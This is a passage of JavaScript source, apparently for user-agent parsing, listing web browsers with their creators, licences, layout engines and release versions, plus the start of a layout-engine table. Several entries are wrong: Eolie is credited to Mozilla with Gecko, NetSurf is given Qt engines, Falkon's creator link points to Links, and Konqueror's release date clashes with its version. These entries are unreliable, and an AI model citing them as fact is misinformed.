                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    },
                    {
                        "name": "LGPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "version": "2.1.2",
                    "date": "14 March 2012"
                }
            },
            "Cliqz": {
                "name": "Cliqz",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Cliqz GmbH"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "1.9.7",
                        "date": "April 4, 2020"
                    },
                    "iOS": {
                        "version": "3.6.3",
                        "date": "June 30, 2020"
                    },
                    "macOS": {
                        "version": "1.38.0",
                        "date": "July 22, 2020"
                    },
                    "Windows": {
                        "version": "1.38.0",
                        "date": "July 22, 2020"
                    },
                    "Linux": {
                        "version": "1.38.0",
                        "date": "July 22, 2020"
                    }
                }
            },
            "Edg": {
                "name": "Microsoft Edge",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Microsoft Corp",
                        "link": "https:\/\/www.microsoftedgeinsider.com\/en-us\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "version": "88.0.673.0",
                    "date": "14 October 2020"
                }
            },
            "Opera": {
                "name": "Opera",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Opera Software",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Opera_Software"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "version": "71.0.3770.271",
                    "date": "14 October 2020"
                }
            },
            "Opera Mobile": {
                "name": "Opera",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Opera Software",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Opera_Software"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "59.1.2926.54067",
                        "date": "July 13, 2020"
                    },
                    "Android (classic)": {
                        "version": "12.1.9",
                        "date": "June 8, 2016"
                    },
                    "Symbian": {
                        "version": "S60 12.0.22",
                        "date": "June 24, 2012"
                    },
                    "Windows Mobile": {
                        "version": "10.0",
                        "date": "March 16, 2010"
                    }
                }
            },
            "whale": {
                "name": "Naver Whale",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Naver Corporation",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Naver_Corporation"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Freeware",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "1.5.4.2",
                        "date": "May 26, 2020"
                    },
                    "iOS": {
                        "version": "1.5.0",
                        "date": "May 25, 2020"
                    },
                    "macOS": {
                        "version": "2.7.100.20",
                        "date": "June 18, 2020"
                    },
                    "Windows": {
                        "version": "2.7.100.20",
                        "date": "June 18, 2020"
                    },
                    "Linux": {
                        "version": "2.7.100.20",
                        "date": "June 18, 2020"
                    }
                }
            },
            "Falkon": {
                "name": "Falkon",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "David Rosca",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Links_(web_browser)"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL 3.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "3.1.0.75",
                        "date": "March 19, 2019"
                    }
                ]
            },
            "Konqueror": {
                "name": "Konqueror Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "KDE",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/KDE"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "KHTML",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/KHTML"
                    },
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "20.08.2",
                        "date": "7 June 2018"
                    },
                    "Preview release": []
                }
            },
            "YaBrowser": {
                "name": "Yandex Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Yandex",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Yandex"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "20.6.3.54",
                        "date": "July 23, 2020"
                    },
                    "iOS": {
                        "version": "20.6.2.318",
                        "date": "July 16, 2020"
                    },
                    "macOS": {
                        "version": "20.7.2",
                        "date": "July 2020"
                    },
                    "Windows": {
                        "version": "20.7.2",
                        "date": "July 2020"
                    },
                    "Linux": {
                        "version": "20.7.2",
                        "date": "July 2020"
                    }
                }
            },
            "QtWebEngine": {
                "name": "Qt Web Engine based browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Dooble Project Team",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Dooble"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2020.10.10",
                        "date": "October 10, 2020"
                    }
                ]
            },
            "Iron": {
                "name": "SRWare Iron",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "SRWare",
                        "link": "www.srware.net\/en\/software_srware_iron.php"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    },
                    {
                        "name": "V8",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/V8_(JavaScript_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "74.0.3850.0",
                        "date": "May 10, 2019"
                    },
                    "macOS": {
                        "version": "84.0.4300.0",
                        "date": "August 29, 2020"
                    },
                    "Windows": {
                        "version": "85.0.4350.0",
                        "date": "October 2, 2020"
                    },
                    "Linux": {
                        "version": "85.0.4350.0",
                        "date": "October 6, 2020"
                    }
                }
            },
            "Chrome": {
                "name": "Google Chrome",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Google LLC",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Google"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD (Chromium executable) (some closed-source features)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "86.0.4240.114",
                        "date": "October 22, 2020"
                    },
                    "iOS": {
                        "version": "86.0.4240.93",
                        "date": "October 12, 2020"
                    },
                    "macOS": {
                        "version": "86.0.4240.111",
                        "date": "October 20, 2020"
                    },
                    "Windows": {
                        "version": "86.0.4240.111",
                        "date": "October 20, 2020"
                    },
                    "Linux": {
                        "version": "86.0.4240.111",
                        "date": "October 20, 2020"
                    }
                }
            },
            "Chromium": {
                "name": "Chromium Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "The Chromium Project",
                        "link": "https:\/\/www.chromium.org\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "name": "built nightly",
                        "link": "https:\/\/chromium.woolyss.com\/"
                    }
                ]
            },
            "Comodo_Dragon": {
                "name": "Comodo Dragon",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Comodo Group",
                        "link": "https:\/\/www.comodo.com\/home\/browsers-toolbars\/internet-products.php"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "83.0.4103.116",
                        "date": "July 21, 2020"
                    }
                ]
            },
            "IceDragon": {
                "name": "Comodo Ice Dragon",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Comodo Group",
                        "link": "https:\/\/www.comodo.com\/home\/browsers-toolbars\/internet-products.php"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "65.0.2.15",
                        "date": "June 19, 2019"
                    }
                ]
            },
            "Dillo": {
                "name": "Dillo",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "The Dillo team",
                        "link": "https:\/\/www.dillo.org\/"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "custom"
                    }
                ],
                "latest-release": [
                    {
                        "version": "3.0.5",
                        "date": "30 June 2015"
                    }
                ]
            },
            "Dooble": {
                "name": "Dooble",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Dooble Project Team",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Dooble"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2020.10.10",
                        "date": "October 10, 2020"
                    }
                ]
            },
            "ELinks": {
                "name": "ELinks",
                "type": "Web Browser",
                "ui": "TextBasedMode",
                "creator": [
                    {
                        "name": "Baudis, Fonseca, et al.",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/ELinks"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "custom",
                        "note": "fork of Links"
                    }
                ],
                "latest-release": [
                    {
                        "version": "0.11.7",
                        "date": "22 August 2009"
                    }
                ]
            },
            "Epiphany": {
                "name": "GNOME Web",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Marco Pesenti Gritti",
                        "link": "https:\/\/www.gnome.org\/news\/2015\/05\/goodbye-marco\/"
                    },
                    {
                        "name": "The GNOME Project",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/The_GNOME_Project"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKitGTK",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKitGTK"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "3.38.1",
                        "date": "8 October 2020"
                    },
                    "Preview release": {
                        "version": "3.37.92",
                        "date": "13 September 2020"
                    }
                }
            },
            "Links": {
                "name": "Links",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Patocka, et al",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Links_(web_browser)"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "custom"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2.21",
                        "date": "2 August 2020"
                    }
                ]
            },
            "Flock": {
                "name": "Flock",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Flock Inc",
                        "link": [
                            "https:\/\/web.archive.org\/web\/20110325151017\/http:\/\/www.flock.com\/",
                            "https:\/\/en.wikipedia.org\/wiki\/Flock_(web_browser)"
                        ]
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "Proprietary",
                        "note": "(as of 3.0)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": [
                    {
                        "version": "3.5.3.4641",
                        "date": "February 1, 2011"
                    }
                ]
            },
            "Waterfox": {
                "name": "Waterfox Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Alex Kontos"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2020.10",
                        "date": "21 October 2020"
                    }
                ]
            },
            "Eolie": {
                "name": "Eolie Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Mozilla Foundation",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Foundation"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "note": "(before v57)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    },
                    {
                        "name": "Gecko w\/Servo",
                        "note": "v57 & after",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Servo_(software)"
                    }
                ],
                "latest-release": {
                    "Standard": {
                        "version": "82.0",
                        "date": "October 20, 2020"
                    },
                    "Extended Support Release": {
                        "version": "78.4.0",
                        "date": "October 20, 2020"
                    }
                }
            },
            "PaleMoon": {
                "name": "PaleMoon Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Moonchild Productions"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Goanna",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Goanna_(software)"
                    }
                ],
                "latest-release": {
                    "Standard": {
                        "version": "28.15.0",
                        "date": "27 October 2020"
                    }
                }
            },
            "SeaMonkey": {
                "name": "SeaMonkey Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "SeaMonkey Council"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "2.53.4",
                        "date": "September 22, 2020"
                    },
                    "Preview release": {
                        "version": "2.53.5b1",
                        "date": "October 29, 2020"
                    }
                }
            },
            "SalamWeb": {
                "name": "SalamWeb Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "SalamWeb",
                        "link": "https:\/\/salamweb.com\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Freeware",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Windows": {
                        "version": "4.5",
                        "date": "July 31, 2020"
                    },
                    "Android": {
                        "version": "4.5.0.40",
                        "date": "June 25, 2020"
                    },
                    "macOS": {
                        "version": "4.5",
                        "date": "June 20, 2020"
                    },
                    "iOS": {
                        "version": "4.5",
                        "date": "June 20, 2020"
                    }
                }
            },
            "firefox": {
                "name": "Firefox Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Mozilla Foundation",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Foundation"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "note": "(before v57)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    },
                    {
                        "name": "Gecko w\/Servo",
                        "note": "v57 & after",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Servo_(software)"
                    }
                ],
                "latest-release": {
                    "Standard": {
                        "version": "82.0",
                        "date": "October 20, 2020"
                    },
                    "Extended Support Release": {
                        "version": "78.4.0",
                        "date": "October 20, 2020"
                    }
                }
            },
            "Galeon": {
                "name": "Galeon Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Marco Pesenti Gritti",
                        "link": "https:\/\/www.gnome.org\/news\/2015\/05\/goodbye-marco\/"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2.0.7",
                        "date": "27 September 2008"
                    }
                ]
            },
            "iCab": {
                "name": "iCab Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Alexander Clauss",
                        "link": "https:\/\/www.clauss-net.de\/"
                    }
                ],
                "cost": "Free, $20 (Pro)",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary (browser)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    },
                    {
                        "name": "LGPL (WebKit)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": [
                    {
                        "version": "5.9.2",
                        "date": "March 4, 2020"
                    }
                ]
            },
            "curl": {
                "name": "Client URL",
                "type": "Web Browser",
                "ui": "FullTextMode",
                "creator": [
                    {
                        "name": "Daniel Stenberg",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Daniel_Stenberg"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Free Software: MIT\/X derivate license",
                        "link": "https:\/\/curl.haxx.se\/docs\/copyright.html"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "7.73.0",
                        "date": "14 October 2020"
                    }
                }
            },
            "Lynx": {
                "name": "Lynx",
                "type": "FTP client \/ HTTP client",
                "ui": "TextBasedMode",
                "creator": [
                    {
                        "name": "Montulli, Grobe, Rezac, et al"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "custom, fork of libwww",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Libwww"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2.8.9rel.1",
                        "date": "8 July 2018"
                    }
                ]
            },
            "msie": "msie",
            "Midori": {
                "name": "Midori Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Christian Dywan, et al.",
                        "link": "https:\/\/astian.org\/en\/midori-browser\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "LGPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": {
                    "Stable release": [],
                    "Preview release": {
                        "version": "9.0",
                        "date": "July 29, 2019"
                    }
                }
            },
            "NetSurf": {
                "name": "NetSurf Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "The NetSurf Developers",
                        "link": "http:\/\/www.netsurf-browser.org\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Qt WebEngine",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Qt_WebEngine"
                    },
                    {
                        "name": "QtWebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/QtWebKit"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "3.10",
                        "date": "May 24, 2020"
                    },
                    "Preview release": []
                }
            },
            "Otter": {
                "name": "Otter Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Micha\u0142 Dutkiewicz",
                        "link": "https:\/\/otter-browser.org\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPLv3",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Qt WebEngine",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Qt_WebEngine"
                    },
                    {
                        "name": "QtWebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/QtWebKit"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "1.0.01",
                        "date": "1 January 2019"
                    },
                    "Preview release": {
                        "version": "weekly333",
                        "date": "May 18, 2020"
                    }
                }
            },
            "Maxthon": {
                "name": "Maxthon Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Maxthon International Ltd",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Maxthon"
                    }
                ],
                "cost": "\tFree",
                "status": "Active",
                "licence": [
                    {
                        "name": "Freeware",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    },
                    {
                        "name": "Trident",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "Windows": {
                        "version": "5.3.8.2000",
                        "date": "October 25, 2019"
                    },
                    "Android": {
                        "version": "5.2.3.3241",
                        "date": "January 25, 2019"
                    },
                    "macOS": {
                        "version": "5.1.60",
                        "date": "August 27, 2018"
                    },
                    "iOS": {
                        "version": "5.4.5",
                        "date": "July 21, 2020"
                    },
                    "Windows Phone": {
                        "version": "2.2.0",
                        "date": "March 30, 2017"
                    },
                    "Linux": {
                        "version": "1.0.5.3",
                        "date": "September 9, 2014"
                    }
                }
            },
            "safari": {
                "name": "safari Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Apple Inc.",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Apple_Inc."
                    }
                ],
                "cost": "Included with macOS and iOS",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary (browser)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    },
                    {
                        "name": "LGPL (WebKit) ",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": {
                    "macOS": {
                        "version": "14.0",
                        "date": "September 17, 2020"
                    },
                    "iOS": {
                        "version": "14.0",
                        "date": "September 17, 2020"
                    }
                }
            }
        };
        /*Web Browser Layout engines List*/ /*
             * Layout engines
             *
             * Gecko is developed by the Mozilla Foundation.
             * Goanna is a fork of Gecko developed by Moonchild Productions.
             * KHTML is developed by the KDE project.
             * Presto was developed by Opera Software for use in Opera. Development stopped as Opera transitioned to Blink.
             * Tasman was developed by Microsoft for use in Internet Explorer 5 for Macintosh.
             * Trident is developed by Microsoft for use in the Windows versions of Internet Explorer 4 to Internet Explorer 11.
             * EdgeHTML is the engine developed by Microsoft for Edge. It is a largely rewritten fork of Trident with all legacy code removed.
             * WebKit is a fork of KHTML by Apple Inc. used in Apple Safari, and formerly in Chromium and Google Chrome.
             * Blink is a 2013 fork of WebKit's WebCore component by Google used in Chromium, Google Chrome, Microsoft Edge, Opera, and Vivaldi.[19]
             * Servo is an experimental web browser layout engine being developed cooperatively by Mozilla and Samsung.*/
        this.webBrowserLayoutList = {
            "EdgeHTML": {
                "name": "EdgeHTML",
                "developer": "Microsoft",
                "contain": "Edg",
                "contain_example": "Edge\/xyz"
            },
            "Blink": {
                "name": "Blink",
                "developer": "Google",
                "contain": "Chrome",
                "contain_example": "Chrome\/xyz"
            },
            "Gecko": {
                "name": "Gecko",
                "developer": "Mozilla Foundation",
                "contain": "Gecko",
                "contain_example": "Gecko\/xyz"
            },
            "Goanna": {
                "name": "Goanna",
                "developer": "Moonchild Productions",
                "contain": "Goanna",
                "contain_example": "Goanna\/xyz"
            },
            "KHTML": {
                "name": "KHTML",
                "developer": "KDE project",
                "contain": "KHTML",
                "contain_example": "KHTML\/xyz"
            },
            "Presto": {
                "name": "Presto",
                "developer": "Opera Software",
                "contain": "Opera",
                "contain_example": "Opera\/xyz"
            },
            "Tasman": {
                "name": "Tasman",
                "developer": "Microsoft",
                "contain": "Tasman",
                "contain_example": "Tasman\/xyz"
            },
            "Trident": {
                "name": "Trident",
                "developer": "Microsoft",
                "contain": "Trident",
                "contain_example": "Trident\/xyz"
            },
            "WebKit": {
                "name": "WebKit",
                "developer": "Apple Inc",
                "contain": "AppleWebKit",
                "contain_example": "AppleWebKit\/xyz"
            },
            "Servo": {
                "name": "Servo",
                "developer": "cooperatively by Mozilla and Samsung",
                "contain": "Servo",
                "contain_example": "Servo\/xyz"
            },
            "libwww-FM": {
